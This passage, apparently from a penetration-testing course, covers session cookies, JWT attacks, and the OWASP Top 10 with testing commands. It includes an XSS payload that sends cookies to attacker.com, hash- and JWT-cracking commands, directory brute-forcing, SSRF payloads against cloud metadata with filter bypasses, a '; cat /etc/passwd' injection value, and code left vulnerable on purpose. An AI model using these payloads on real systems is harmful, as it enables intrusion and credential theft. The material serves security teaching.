+`SameSite=Lax` — The cookie is NOT sent on cross-site background requests (API calls, images, iframes from other sites) but IS sent when a user follows a top-level navigation link from another site. This is the default in modern browsers when SameSite is not specified. It provides good CSRF protection while maintaining the user experience of staying logged in when following links.
+
+`SameSite=None` — The cookie is sent on all requests regardless of origin. This is required for legitimate cross-site cookies (third-party analytics, embedded payment forms, OAuth cross-site flows). Must be paired with `Secure` — browsers refuse to set `SameSite=None` cookies without the Secure flag.
+
+The SameSite attribute, when properly implemented, dramatically reduces CSRF risk. But it is not a complete CSRF defense on its own — implementation inconsistencies across older browsers, subdomain trust relationships, and specific request type exceptions mean CSRF tokens should still be used alongside SameSite.
+
+**Domain and Path Attributes**
+
+`Set-Cookie: session_id=abc; Domain=.example.com; Path=/`
+
+Domain controls which hostnames receive the cookie. `Domain=.example.com` sends the cookie to `example.com` and all its subdomains — `api.example.com`, `app.example.com`, `dev.example.com`. This has a security implication: if any subdomain has an XSS vulnerability, an attacker exploiting that XSS can steal cookies scoped to the entire `.example.com` domain, including the main application's session cookies.
+
+Path controls which URL paths on the server receive the cookie. `Path=/api` would only send the cookie to requests under `/api`. This is rarely used for security (it is more commonly used to prevent cookie bloat from sending large cookies to every request).
+
+### Session Attacks — A Complete Taxonomy with Exploitation Patterns
+
+**Session Hijacking**
+
+The attacker obtains a valid session ID and replays it in their own requests. Attack vectors for obtaining the session ID:
+
+Network interception: If the Secure flag is missing, session cookies travel in cleartext over HTTP. A network eavesdropper (MITM on the same network, rogue Wi-Fi AP, corporate proxy) captures the cookie value. The attacker copies the cookie into their browser and is immediately authenticated as the victim.
+
+XSS theft: If HttpOnly is missing, an XSS payload reads and exfiltrates the cookie:
+```javascript
+// Attacker's XSS payload sent to the victim's browser
+fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie))
+```
+With the cookie captured, the attacker imports it into their browser and takes over the session.
+
+Log extraction: Server access logs sometimes contain session tokens if they appear in URLs (a result of developers incorrectly using GET parameters for session management). Log aggregation systems, monitoring dashboards, and error reporting services are worth checking for session ID exposure.
+
+Server-side session store breach: If the session store (Redis, database) is compromised, all active session IDs are exposed simultaneously.
+
+**Session Fixation**
+
+In session fixation, the attacker does not steal a session — they force a known session ID onto the victim before authentication, then use that known ID after the victim authenticates.
+
+Attack flow:
+1. Attacker visits the login page and receives a pre-authentication session ID from the server (e.g., `session_id=attacker_known_value`)
+2. Attacker sends the victim a link that includes this session ID: `https://bank.example.com/login?session_id=attacker_known_value`
+3. Victim clicks the link and the application sets a cookie with the attacker's known session ID
+4. Victim logs in successfully
+5. The application does NOT generate a new session ID after login — it keeps the same session ID now marked as authenticated
+6. Attacker uses `session_id=attacker_known_value` and is now authenticated as the victim
+
+The complete defense is session ID regeneration on authentication. After a user successfully authenticates, the server must generate a completely new session ID, set it in a new cookie, and invalidate the old session ID. This breaks fixation attacks because even if the attacker forced a known pre-auth session ID, it becomes invalid the moment authentication succeeds.
+
+**Session Prediction**
+
+If session IDs are generated with a weak or predictable algorithm, an attacker who captures a series of session IDs can potentially predict future valid ones. This is less common with modern frameworks (which almost universally use CSPRNGs) but appears in custom session management implementations and legacy systems. During an assessment, capture multiple session IDs and analyze them with tools like Burp Suite's Sequencer, which performs statistical randomness testing on a sample of session tokens.
+
+### JSON Web Tokens (JWTs) — The Modern Alternative and Its Attack Surface
+
+Many modern applications — especially those built as APIs consumed by JavaScript frontends and mobile apps — use JWT (JSON Web Token) authentication rather than server-side sessions. Understanding JWTs deeply is essential for modern web application testing.
+
+A JWT is a self-contained token that carries claims (assertions) about the user, signed cryptographically so the server can verify they have not been tampered with. JWTs have three parts, each Base64Url-encoded and separated by dots:
+
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+.
+eyJzdWIiOiIxMDQyIiwibmFtZSI6IkFsaWNlIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MjE5OTk2MDAsImV4cCI6MTcyMjAyODQwMH0
+.
+SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+```
+
+Decode these three Base64 sections and you get:
+
+**Header:** `{"alg": "HS256", "typ": "JWT"}` — The algorithm used for signing and the token type.
+
+**Payload:** `{"sub": "1042", "name": "Alice", "role": "user", "iat": 1721999600, "exp": 1722028400}` — The claims: user ID, name, role, issued-at time, expiry time.
+
+**Signature:** The HMAC-SHA256 of `base64url(header).base64url(payload)` signed with the server's secret key.
+
+The critical difference between JWTs and server-side sessions: the server does not need to store anything. The token is self-validating — the server just verifies the signature. This makes JWTs stateless in a distributed system sense, which is why they are popular for microservices and APIs.
+
+But this architecture creates specific vulnerabilities.
+
+**JWT Vulnerability 1 — The alg:none Attack**
+
+Early JWT libraries trusted the algorithm specified in the token's own header. An attacker could modify the header to `{"alg": "none"}`, remove the signature entirely, and modify the payload (e.g., change `"role": "user"` to `"role": "admin"`). The library, seeing `alg: none`, would skip signature verification and accept the token.
+
+Modern libraries reject `alg: none`, but it is worth testing on any application using JWTs, especially if the backend seems older or custom-built.
+
+**JWT Vulnerability 2 — Algorithm Confusion (RS256 to HS256)**
+
+This is a more sophisticated and more commonly found attack. Some applications use RS256 (RSA signing with a private key, verified with a public key). The public key is publicly available — that is the point of asymmetric cryptography.
+
+If the application also accepts HS256 (HMAC signing with a symmetric secret), an attacker can:
+1. Get the server's public RSA key (often exposed at a JWKS endpoint like `/auth/.well-known/jwks.json`)
+2. Create a malicious JWT with modified claims and `"alg": "HS256"`
+3. Sign it using the public RSA key as the HMAC secret
+4. When the server processes this JWT, if it uses `alg: HS256`, it verifies the HMAC signature using what it thinks is the HS256 secret — but the attacker signed with the public key, which the server has. The signature validates correctly.
+
+The attacker has created a valid signature for a token they forged.
+
+**JWT Vulnerability 3 — Weak Secret (HS256 Secret Cracking)**
+
+HS256-signed JWTs use a symmetric secret. If this secret is weak (common examples include `secret`, `password`, the application name, the domain name, a short string), it can be cracked offline:
+
+```bash
+# Using Hashcat to crack JWT HS256 secret
+hashcat -a 0 -m 16500 captured_jwt.txt wordlist.txt
+
+# Using jwt_tool for JWT attacks
+python3 jwt_tool.py eyJhbGci... -C -d /usr/share/wordlists/rockyou.txt
+```
+
+Once the secret is known, the attacker can forge arbitrary tokens — changing role, user ID, expiry, or any other claim.
+
+**JWT Vulnerability 4 — Sensitive Claims in Payload**
+
+The JWT payload is Base64Url-encoded, not encrypted. Anyone who has the token can decode and read every claim in it. This is not a vulnerability by itself — the signature ensures integrity. But developers sometimes include sensitive data in JWT claims: plaintext passwords, access tokens for third-party services, PII. Always decode JWT payloads during an assessment and check what data is exposed.
+
+**JWT Testing Tools:**
+- [jwt.io](https://jwt.io) — online decoder and encoder
+- [jwt_tool](https://github.com/ticarpi/jwt_tool) — comprehensive JWT attack framework
+- Burp Suite JWT Editor extension — built-in JWT manipulation in Burp
+- Burp Suite Scanner — automatically tests for common JWT vulnerabilities
+
+---
+
+## 6.1.5 Practice — Attacking and Analyzing Web Sessions
+
+### The Session Security Audit Checklist
+
+When assessing a web application's session management, work through this checklist systematically:
+
+**1. Cookie Flag Analysis**
+In Burp Suite, find any `Set-Cookie` headers in responses. For each session-related cookie:
+- Is `HttpOnly` present? If not: XSS can steal this cookie
+- Is `Secure` present? If not: Cookie transmitted over HTTP in cleartext
+- Is `SameSite` present and configured? If `SameSite=None` or missing: CSRF risk
+
+**2. Session ID Entropy Analysis**
+Capture 20-50 session IDs from multiple login sessions. Paste them into Burp Suite's Sequencer tool (Proxy → HTTP History → right-click a response setting a session cookie → "Send to Sequencer"). Sequencer performs statistical analysis of the session ID entropy and gives you a confidence rating. Low entropy means the session IDs may be predictable.
+
+**3. Session Fixation Test**
+Log in and note your session ID. Log out. Log back in with the same browser session. Does the session ID change? It must. If the same session ID persists across authentication state changes, session fixation may be possible.
+
+**4. Logout Verification**
+Log in and note your session ID. Log out. Now use Burp Repeater to replay a request with your old session ID. Does the server accept it (vulnerability) or reject it with 401/403 (correct behavior)?
+
+**5. Session Timeout Test**
+Log in. Wait for the configured session timeout period (find this in your pre-engagement documentation or test with various idle periods). After timeout, attempt to use your old session ID. Is it invalidated?
+
+**6. JWT Analysis (if applicable)**
+If the application uses JWTs:
+- Decode the header and payload at jwt.io
+- Check what claims are present and whether any sensitive data is exposed
+- Try changing `alg` to `none` and removing the signature
+- Try changing the role or privilege claim and submit with modified payload
+- Use jwt_tool to test for algorithm confusion and weak secrets
+
+---
+
+## 6.1.6 OWASP Top 10 — The Map of the Web Application Attack Surface
+
+### What OWASP Is and Why the Top 10 Exists
+
+The Open Web Application Security Project (OWASP) is a nonprofit foundation founded in 2001, dedicated to improving software security through community-produced open-source documentation, tools, and research. Everything OWASP produces is freely available to everyone — no paywalls, no licenses, no restrictions.
+
+Their most influential output is the **OWASP Top 10**: a data-driven, consensus-based list of the ten most critical security risks in web applications. The list is compiled by analyzing data from hundreds of organizations worldwide covering millions of applications, supplemented by a community survey of security professionals. It is updated approximately every three to four years to reflect changes in the threat landscape.
+
+The OWASP Top 10 is not just an academic exercise. It is referenced in regulatory frameworks (PCI DSS requires testing against the OWASP Top 10 for in-scope web applications), contractual requirements (enterprise security assessments specify OWASP coverage), and certifications (CompTIA PenTest+, CEH, OSCP all test knowledge of these categories). If you work in web application security at any level, the OWASP Top 10 is the vocabulary you think and communicate in.
+
+The current official version is **OWASP Top 10:2021**, which remains the primary reference as of 2025–2026. OWASP published a 2025 Release Candidate with notable category changes; we cover both versions here.
+
+### A01:2021 — Broken Access Control
+
+**The #1 most prevalent web vulnerability. Found in 3.81% of all tested applications — more than any other category.**
+
+Access control is the mechanism that determines what authenticated users are permitted to do. It answers the question: "This user is authenticated — but are they authorized to do THIS specific thing?"
+
+Broken access control means these checks are absent, incomplete, or bypassable. The impact ranges from one user reading another user's data to a regular user gaining administrative control of the entire application.
+
+**The core failure:** Access control is often enforced only at the UI level. The admin link is hidden from regular users in the navigation menu. The premium feature button is grayed out for free users. But the server-side endpoints behind these UI elements accept any authenticated request — they do not verify whether the authenticated user has the permission level required. Remove the UI restriction, and you have full access to what was supposed to be restricted.
+
+**IDOR — Insecure Direct Object Reference:**
+
+The most common and most impactful manifestation of broken access control. An application exposes internal object identifiers — database IDs, filenames, record numbers — directly to users, and does not verify that the requesting user is authorized to access the specific object requested.
+
+Classic example: A healthcare portal lets patients view their medical records at `/api/records/8812`. Patient Alice has ID 8812. She notices the ID in the URL and wonders: what happens if she changes it to 8813? If the server returns another patient's records without checking that Alice is authorized to access record 8813, this is a critical IDOR vulnerability. Patient medical records, financial data, personal information — all exposed to any authenticated user who can enumerate IDs.
+
+The reason IDOR is so prevalent: developers add authentication ("you must be logged in") but forget authorization ("you must own this resource"). These are different controls. Authentication proves who you are. Authorization proves what you are allowed to do.
+
+**During penetration testing, IDOR discovery looks like this:**
+
+Find any numeric ID in a URL or request parameter — user IDs, order IDs, document IDs, message IDs, invoice IDs. Systematically modify these values: increment, decrement, try neighboring values. Use Burp Suite's Intruder to enumerate a range automatically. If the server returns data for IDs belonging to other users, you have confirmed IDOR. For APIs that use less obvious object references (UUIDs instead of sequential integers), look for leaked IDs in other parts of the application — a UUID might appear in one API response and be reusable as a reference in a different API call.
+
+**Forced Browsing — Accessing Hidden Endpoints Directly:**
+
+The application's UI does not show the admin panel to regular users. But the admin panel still exists at `/admin/dashboard`. Does the server check the user's role before serving it?
+
+Testing process: Use directory brute forcing (gobuster, ffuf, dirbuster) to discover endpoints. Then attempt to access them while authenticated as a regular user. Compare what a regular user can access versus what an administrator can access. Any endpoint accessible to the wrong user level is a finding.
+
+```bash
+# Directory brute force to discover hidden admin paths
+gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,aspx,jsp -b 404,403
+
+# More targeted admin path enumeration
+ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -fc 404 -mc 200,301,302,403
+```
+
+Note that 403 responses during directory brute forcing are high-value findings — they indicate the path exists and requires authorization, making them candidates for access control bypass testing.
+
+**HTTP Method Manipulation:**
+
+The application correctly blocks `GET /admin/users` for regular users. But `POST /admin/users` with a body containing the same parameters? Or `PUT /admin/users/1042`? Many access control implementations check the method and route together rather than checking the resource and the user's permissions independently. Test every HTTP method against every endpoint.
+
+**Parameter Tampering:**
+
+Hidden form fields, URL parameters, and JSON body fields sometimes carry role or privilege information that the server trusts without server-side verification. A request body containing `{"role": "user", "action": "view_report"}` that the attacker changes to `{"role": "admin", "action": "view_report"}` — does the server accept the user-supplied role? It should not. But many do.
+
+**Tools for Automated IDOR Testing:**
+- **Autorize** (Burp Suite extension): Automatically replays every request you make as a higher-privileged user with a lower-privileged user's session, flagging requests where the lower-privileged user receives equivalent access
+- **AuthMatrix** (Burp Suite extension): Maps out which users should have access to which endpoints and highlights violations
+
+### A02:2021 — Cryptographic Failures
+
+**Previously called "Sensitive Data Exposure" — renamed to focus on the root cause rather than the symptom.**
+
+This category covers every failure to protect sensitive data with appropriate cryptography — when data should be encrypted but is not, when it is encrypted but with algorithms too weak to provide real protection, or when encryption is implemented incorrectly in ways that defeat its security properties.
+
+**Passwords stored incorrectly:**
+
+Passwords must never be stored as plaintext. This is elementary. But what is the correct alternative?
+
+Many developers know "hash the password" but do not know which hash to use. MD5 is NOT acceptable. SHA-1 is NOT acceptable. SHA-256 without a salt is NOT acceptable. These are fast hashing algorithms — designed to process large amounts of data quickly, which means an attacker with a GPU can compute billions of hashes per second and crack a database of MD5 passwords in hours.
+
+The correct solution is password hashing algorithms specifically designed to be slow and memory-intensive: **bcrypt**, **scrypt**, **Argon2**, or **PBKDF2**. These are deliberately slow — a bcrypt operation with a work factor of 12 takes approximately 300 milliseconds. That is long enough to frustrate fast brute-force cracking while being imperceptible to users. Argon2id (the 2015 Password Hashing Competition winner) is currently the strongest recommendation.
+
+During a penetration test, discovering a database with MD5-hashed passwords is a critical finding. You can demonstrate impact by cracking several hashes with hashcat against the rockyou.txt wordlist — this typically cracks 30-60% of a real-world password database within minutes.
+
+```bash
+# Crack MD5 hashes from a database dump
+hashcat -m 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Crack bcrypt (much slower even with GPU)
+hashcat -m 3200 bcrypt_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Crack SHA-256 without salt
+hashcat -m 1400 sha256_hashes.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
+```
+
+**Transmitting data over HTTP instead of HTTPS:**
+
+Any sensitive data sent over plaintext HTTP is readable to any network observer. This includes login credentials, session cookies, API keys, personal information, financial data, and medical records.
+
+Testing this: Visit the application over HTTP (`http://` not `https://`). Does it redirect to HTTPS? Or does it serve the login form over HTTP? Submit the login form and watch in Burp — are credentials transmitted in cleartext? Check whether the `Secure` flag is missing from session cookies (which means they can be transmitted over HTTP).
+
+**TLS version and cipher suite weaknesses:**
+
+Even when HTTPS is used, weak TLS configurations create vulnerabilities.
+
+Testing TLS configuration:
+```bash
+# testssl.sh — comprehensive TLS security test
+testssl.sh https://target.com
+
+# sslscan — cipher suite enumeration
+sslscan target.com
+
+# nmap TLS scripts
+nmap --script ssl-enum-ciphers -p 443 target.com
+
+# Online: SSL Labs provides detailed TLS analysis
+# https://www.ssllabs.com/ssltest/analyze.html?d=target.com
+```
+
+Look for: TLS 1.0 or 1.1 support (deprecated — vulnerable to BEAST, POODLE), weak cipher suites (RC4, 3DES, export-grade ciphers), expired or self-signed certificates, missing HSTS.
+
+**Sensitive data in unexpected places:**
+
+Sensitive data appears in places developers do not think to check: JavaScript files (hardcoded API keys, internal endpoint paths, debug credentials), HTML comments (developer notes often contain environment details, passwords, internal system names), error messages (stack traces, SQL queries, file paths), log files accessible via the web, backup files (`.bak`, `.old`, `.swp`, `.~`, database dump files).
+
+Testing this:
+```bash
+# Search JavaScript files for secrets
+# In Burp: Spider the application, review all JS files in the site map
+# Tools: trufflehog, gitleaks (for repositories)
+# grep for patterns in downloaded JS files:
+grep -r "api_key\|apikey\|password\|secret\|token" /path/to/js/files/
+
+# Directory brute force targeting common sensitive file extensions
+gobuster dir -u https://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x bak,old,sql,env,config,backup,zip,tar,gz
+```
+
+### A03:2021 — Injection
+
+**The most thoroughly tested category — 94% of tested applications were tested for injection vulnerabilities. Still causes some of the most devastating breaches.**
+
+Injection is conceptually simple: user-controlled input is interpreted as code by an interpreter (SQL database, OS shell, LDAP server, XML parser, template engine). The application fails to distinguish between the command structure and the data — user input is part of the command rather than a safely isolated parameter.
+
+This entire category is covered in exhaustive detail in **Section 6.4**. Here we establish the conceptual foundation:
+
+**SQL Injection** is the most impactful injection type. A web application builds database queries by concatenating user input:
+
+```php
+// VULNERABLE code (PHP example)
+$username = $_POST['username'];
+$password = $_POST['password'];
+$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+```
+
+If an attacker enters `admin'--` as the username, the resulting query becomes:
+```sql
+SELECT * FROM users WHERE username='admin'--' AND password='anything'
+```
+
+The `--` comments out the rest of the SQL query. The password check disappears. This is authentication bypass — the attacker is logged in as admin without knowing the password.
+
+This vulnerability has ended careers, bankrupted companies, and exposed hundreds of millions of records. And it is trivially preventable: use parameterized queries (prepared statements) that treat user input as data, never as part of the SQL syntax.
+
+**OS Command Injection** occurs when user input is passed to shell commands:
+
+```python
+# VULNERABLE code (Python example)
+import os
+filename = request.form['filename']
+os.system(f"convert {filename} output.pdf")
+```
+
+If the user provides `; cat /etc/passwd` as the filename, the command becomes `convert ; cat /etc/passwd output.pdf`. The shell executes both commands — the conversion and the file read. Impact: arbitrary operating system command execution on the server.
+
+**Cross-Site Scripting (XSS)** is now classified under Injection because it shares the same root cause: user input is interpreted as code (HTML/JavaScript) rather than data. XSS is important enough that it appears as its own OWASP entry in some discussions and has its own dedicated section in this module (Section 6.7).
+
+### A04:2021 — Insecure Design
+
+**New in 2021. The only category that cannot be fixed with a patch — it requires redesigning the feature.**
+
+Insecure design is different from implementation vulnerabilities. An implementation vulnerability means the code could have been written correctly but was not. Insecure design means the design itself is fundamentally flawed — no matter how well the code implements it, the design creates unacceptable risk.
+
+Examples that illustrate the distinction:
+
+A password reset feature that works by sending a new password in the email is insecure by design. It does not matter how securely the new password is generated, how carefully the email is formatted, how properly the database is updated. The design decision — delivering credentials in email — is the vulnerability. The correct design is sending a time-limited, single-use reset link.
+
+A rate limiting system that only counts failed logins from the same IP address is insecure by design against distributed credential stuffing. An attacker using a botnet of thousands of IPs makes one attempt per IP — each attempt is below the per-IP rate limit, but collectively the attack proceeds unimpeded. A design that considers the velocity of attempts against a specific account, regardless of source IP, is fundamentally more sound.
+
+A ticket booking system that allows unlimited "hold" reservations without completing purchase enables a denial-of-service attack on ticket availability. No implementation detail changes this — it is a design that does not account for abuse.
+
+Identifying insecure design requires security thinking during the design phase — threat modeling, security requirements analysis, and adversarial thinking before code is written. For penetration testers, this means understanding business logic well enough to identify how legitimate features can be abused in ways that are not bugs in the traditional sense.
+
+### A05:2021 — Security Misconfiguration
+
+**The broadest category — affects every layer of the technology stack, from the web server to the cloud configuration.**
+
+Security misconfiguration is any situation where a system is technically capable of being secure but has been deployed in an insecure configuration. This is perhaps the most common finding in real-world web application assessments because it requires neither implementation expertise nor sophisticated attack techniques — often just knowing where to look.
+
+**Default credentials:** Factory-default usernames and passwords on network devices, database servers, application admin consoles, and management interfaces. Shodan finds millions of devices with default credentials. `admin:admin`, `admin:password`, `root:root`, `cisco:cisco` — these credentials, which manufacturers set for initial configuration and expect to be changed, are often never changed.
+
+**Debug mode and verbose error messages:** Every major web framework has a debug mode intended for development that provides detailed error information — stack traces, SQL queries, file paths, configuration values — in HTTP responses. In production, this information is a reconnaissance goldmine for attackers. A single 500 error page in debug mode can reveal the entire technology stack, database schema, internal network addressing, and application architecture.
+
+**Unnecessary services enabled:** A server configured to run both HTTPS (necessary) and FTP, Telnet, and SNMP (unnecessary legacy services with known vulnerabilities). An application server with SSH enabled on all interfaces. A web server with directory listing enabled, allowing attackers to browse the file structure.
+
+**Cloud storage misconfigurations:** Public S3 buckets (AWS), public Blob containers (Azure), public GCS buckets (Google Cloud) are the most common and most impactful misconfiguration in cloud environments. An S3 bucket configured for public access exposes every file stored in it to anyone on the internet. Billions of sensitive records have been exposed this way. The names of buckets often follow predictable patterns based on the company name.
+
+```bash
+# Test for public S3 buckets
+aws s3 ls s3://company-name --no-sign-request
+aws s3 ls s3://company-backups --no-sign-request
+aws s3 ls s3://company-production --no-sign-request
+
+# S3Scanner for systematic bucket enumeration
+s3scanner scan --bucket company-name
+s3scanner scan --bucket-file probable_bucket_names.txt
+```
+
+**Missing HTTP security headers:** As enumerated in the HTTP headers section above — missing CSP, X-Frame-Options, HSTS, X-Content-Type-Options. Each missing header enables specific attack classes.
+
+### A06:2021 — Vulnerable and Outdated Components
+
+**The vulnerability that caused the Equifax breach — 147 million records — and countless others.**
+
+Modern web applications are composed largely of third-party components: JavaScript frameworks, npm packages, Python pip packages, Java Maven dependencies, WordPress plugins, Ruby gems, operating system packages. Each component has its own vulnerability history. Running outdated versions means running known vulnerabilities that attackers can exploit with publicly available tools.
+
+The Equifax breach is the defining case study. In May 2017, Apache disclosed CVE-2017-5638 — a critical remote code execution vulnerability in Apache Struts 2. They released a patch on the same day. Equifax's security team was notified. They did not apply the patch. In July 2017, attackers discovered that Equifax had not patched and exploited the vulnerability to access their network. Over 76 days, attackers accessed the personal and financial records of 147.9 million Americans, including Social Security numbers, birth dates, addresses, and driver's license numbers. The vulnerability was disclosed and patched before the breach — the breach happened because the patch was not applied.
+
+**During penetration testing, component identification works like this:**
+
+Identify component versions from HTTP headers (`Server`, `X-Powered-By`), HTML source code (meta tags, JavaScript file names often include version numbers like `jquery-3.3.1.min.js`), directory structures (default paths for specific CMS versions), and response behavior.
+
+```bash
+# WhatWeb - technology identification
+whatweb https://target.com -v
+
+# Wappalyzer CLI
+wappalyzer https://target.com
+
+# Identify WordPress version
+curl -s https://target.com/wp-includes/version.php
+curl -s "https://target.com/feed/" | grep "generator"
+
+# Check JavaScript libraries in page source for version numbers
+curl -s https://target.com | grep -i "jquery\|bootstrap\|angular\|react\|vue" | head -20
+
+# Cross-reference identified versions against CVE database
+searchsploit wordpress 5.7
+searchsploit apache tomcat 9.0.37
+nuclei -u https://target.com -tags cve -severity critical,high
+```
+
+### A07:2021 — Identification and Authentication Failures
+
+**The entire category of "how the application knows who you are and how that can go wrong."**
+
+Authentication is proving who you are. Identification is claiming who you are. Failures in these processes allow attackers to impersonate legitimate users or escalate their own privileges.
+
+This category is the subject of **Section 6.5** in its entirety. Here we map the key failure modes:
+
+**Credential brute force and stuffing:** Applications that do not rate limit login attempts allow attackers to try thousands of passwords programmatically. Even with rate limiting, if no account lockout is implemented after N failures, a slow brute force with reasonable pauses remains viable. Credential stuffing — testing username/password pairs leaked in previous breaches against a new application — exploits password reuse, which research shows affects 65% of users.
+
+**Weak password policies:** Allowing passwords like "password", "123456", or the username itself. Not checking new passwords against known-breached password lists.
+
+**Insecure password reset:** A reset token that is too short (4-6 digit numeric codes susceptible to brute force), too long-lived (tokens that do not expire allow replay attacks), or sent via an insecure channel.
+
+**Session management failures:** As discussed in 6.1.4 — predictable session IDs, missing regeneration after authentication, no server-side invalidation on logout.
+
+**Missing or bypassable MFA:** Applications with no second factor, or with second factors that can be bypassed (e.g., the MFA check occurs client-side in JavaScript, or the MFA verification endpoint is accessible after the first factor without requiring the second).
+
+### A08:2021 — Software and Data Integrity Failures
+
+**The category that includes insecure deserialization and supply chain attacks.**
+
+This category covers any failure to verify the integrity of software, data, or update processes. The escalating frequency of supply chain attacks makes this category increasingly important.
+
+**Insecure deserialization** is the most technically complex vulnerability class in this category. Serialization converts an in-memory object to a format (byte stream, JSON, XML) for transmission or storage. Deserialization reverses this — reconstructing the object from the serialized form. Insecure deserialization occurs when applications deserialize data from untrusted sources without validation.
+
+The attack works by exploiting how the deserialization library reconstructs objects. In Java, many libraries invoke methods (particularly `readObject()`) during deserialization. If the class library path contains classes with dangerous `readObject()` methods — called "gadget chains" — an attacker who can provide serialized input can trigger arbitrary code execution simply by causing the dangerous method to be called during deserialization.
+
+Indicators of Java serialization in HTTP traffic:
+```
+# In request body or cookie values, look for:
+Content-Type: application/x-java-serialized-object
+# Or Base64 values starting with: rO0A (decodes to: ac ed 00 05 - Java serialized object magic bytes)
+```
+
+Tool for generating Java deserialization exploit payloads: **ysoserial** — generates malicious serialized objects that execute specified commands when deserialized by vulnerable libraries.
+
+**Supply chain attacks:** The SolarWinds attack (2020) and the XZ Utils backdoor (2024) demonstrated that even organizations with strong perimeter security can be compromised through their trusted software supply chain. For web application testing, this manifests as evaluating whether the application uses third-party dependencies that could introduce malicious code.
+
+### A09:2021 — Security Logging and Monitoring Failures
+
+**The category that determines whether a breach is detected in hours or months.**
+
+The average time between a breach occurring and being detected, according to IBM's 2024 Cost of a Data Breach Report, is 194 days. That is six and a half months of undetected attacker activity. The gap between breach and detection is where logging and monitoring failures live.
+
+This category is unique among the OWASP Top 10: it does not describe a direct vulnerability that attackers exploit. It describes the failure to detect that attacks are happening. Without logging, a penetration test that compromises an application leaves no trace the security team can investigate.
+
+**What must be logged:**
+- Authentication events: every login attempt (successful and failed), every password change, every MFA event
+- Access control failures: every 403 response (someone tried to access something they are not authorized for)
+- Input validation failures: every rejected input that might indicate injection testing
+- High-risk operations: administrative actions, privilege changes, data exports
+- Session lifecycle: session creation, session expiry, logout
+
+**Common logging failures:**
+- Not logging at all ("we'll add logging later")
+- Logging to the same filesystem that an attacker might compromise (an attacker who compromises a server can delete local logs)
+- No centralized aggregation (each server keeps its own logs, making correlation across the environment impossible)
+- No alerting (logs collected but never reviewed in real time)
+- Excessive logging that creates too much noise to find signals
+
+**For penetration testers:** Testing monitoring is typically done by conducting obvious attack activity (automated scanner traffic, brute force attempts, obviously malformed input) and asking the client whether any alerts fired. A complete penetration test that generates no security alerts despite conducting active exploitation is itself a critical finding about the organization's detection capability.
+
+### A10:2021 — Server-Side Request Forgery (SSRF)
+
+**New to the OWASP Top 10 in 2021. Critically important in cloud environments.**
+
+SSRF occurs when an application fetches a remote resource based on user-controlled input without validating whether that URL is safe to request. The result is that the server makes requests on the attacker's behalf — to internal services, to cloud metadata endpoints, or to other resources the attacker cannot reach directly.
+
+Imagine an application with a "preview this link" feature — you provide a URL and the application fetches it and shows you a preview. The application server makes an HTTP request to whatever URL you provide. If you provide `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — the AWS Instance Metadata Service address — and the application is running on an AWS EC2 instance, the server fetches this internal URL and returns the IAM credentials of the instance's IAM role.
+
+Cloud infrastructure metadata services are the most impactful SSRF targets:
+- **AWS:** `http://169.254.169.254/latest/meta-data/` — returns IAM credentials, instance details, user data scripts
+- **Azure:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01` with `Metadata: true` header
+- **GCP:** `http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google` header
+
+Successful SSRF against a cloud metadata endpoint returns IAM credentials that can be used to make AWS/Azure/GCP API calls with the instance's permissions — potentially accessing S3 buckets, databases, secrets manager, and other cloud resources far beyond the application itself.
+
+**Finding SSRF entry points:**
+
+Any feature that makes outbound HTTP requests based on user input is an SSRF candidate:
+- Link preview / URL metadata fetching
+- Webhook configuration (user provides a URL that receives events)
+- Document/PDF generation from a URL
+- "Import from URL" features
+- Image proxying
+- Server-side OAuth flows
+- XML parsers (XXE can trigger SSRF through external entity declarations)
+- PDF generators processing CSS `url()` references
+
+**Testing for SSRF:**
+
+Use Burp Suite's Collaborator (or interactsh for an open-source alternative) to generate a unique callback URL. Submit this URL to any suspected SSRF entry point. If your Collaborator receives an HTTP or DNS request from the target application's IP range, you have confirmed the application makes outbound requests — which is SSRF.
+
+Then escalate to internal targets:
+```
+http://127.0.0.1/admin
+http://localhost:8080/
+http://169.254.169.254/
+http://192.168.1.1/
+http://10.0.0.1/
+```
+
+Bypass attempts when IP-based filtering is in place:
+```
+# Decimal encoding of 127.0.0.1
+http://2130706433/
+
+# Octal encoding
+http://0177.0.0.1/
+
+# Hex encoding
+http://0x7f000001/
+
+# IPv6 loopback
+http://[::1]/
+
+# DNS rebinding: a domain that resolves to 127.0.0.1
+http://localtest.me/
+
+# URL-encoded components
+http://127.0.0.1%2f@attacker.com/
+```
+
+### The OWASP Top 10:2025 — What Is Changing and Why It Matters
+
+OWASP's 2025 Release Candidate reflects the evolving threat landscape. Key changes:
+
+**A01:2025 — Broken Access Control** remains the most prevalent category at #1. Significantly: SSRF has been absorbed into this category rather than standing alone, reflecting the understanding that SSRF is fundamentally an access control failure — the application makes requests it should not be permitted to make.
+
+**A02:2025 — Security Misconfiguration** jumped from #5 to #2. As applications become more configuration-driven (containers, infrastructure-as-code, cloud services), misconfiguration has overtaken many implementation-level vulnerabilities in frequency.
+
+**A03:2025 — Software Supply Chain Failures** expands the previous "Vulnerable and Outdated Components" to encompass the full scope of supply chain risk — compromised build pipelines (SolarWinds-style attacks), malicious package injection (PyPI/npm poisoning), and transitive dependency vulnerabilities.
+
+**Injection dropped from #3 to #5**. Better static analysis tooling and developer education have made classic injection vulnerabilities somewhat less prevalent — though they remain critically impactful when found.
+
+**New entries and considerations for 2025:** Race conditions and Time-of-Check to Time-of-Use (TOCTOU) vulnerabilities are gaining attention. Web cache poisoning is increasingly significant. AI-specific vulnerabilities (prompt injection in LLM-integrated applications, model manipulation) are being discussed for explicit inclusion.
+
+---
+
+## 6.1.7 Lab — Website Vulnerability Scanning
+
+### Understanding What Automated Scanners Do and Do Not Catch
+
